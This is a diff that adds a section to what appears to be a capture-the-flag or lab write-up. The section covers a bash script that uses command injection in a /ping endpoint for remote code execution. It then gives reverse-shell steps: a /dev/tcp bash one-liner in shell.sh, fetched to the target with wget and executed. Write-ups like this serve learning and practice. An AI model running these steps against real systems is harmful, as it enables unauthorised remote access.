@@ -71,5 +71,42 @@ Great !!!
 
 ---
 
+## command injection script
+
+im gonna be a little fancy here before continuing  
+this is just for the sake of it, but i'm practicing bash scripting and i just learned how to color output  
+lets make an script that applies the technique used on */ping* to achieve easy RCE and a reverse shell  
+
+so this is the way it works : we start the script with params **remote ip** and **local ip**  
+also, we need to start a listener on port 80 of our machine  
+![](./contents/screenshots/screenshot7.png)  
+
+now we enter a command and the output will be displayed on the listener  
+![](./contents/screenshots/screenshot8.png)  
+
+the script will end, and if we need to enter another command we have to execute the script and start the listener again  
+
+### reverse shell
+
+after trying different techniques, the one that worked for me was :  
+
+create the following script **shell.sh** on my machine
+```bash
+#!/bin/bash
+
+bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1
+```
+
+start an http server  
+
+download it on the remote machine with **wget**  
+
+give permissions to it with ```chmod +x shell.sh```
+
+start a listener on the local port specified
+
+execute it with ```./shell.sh```
+
+we have a reverse shell on the remote machine !!!
 
 
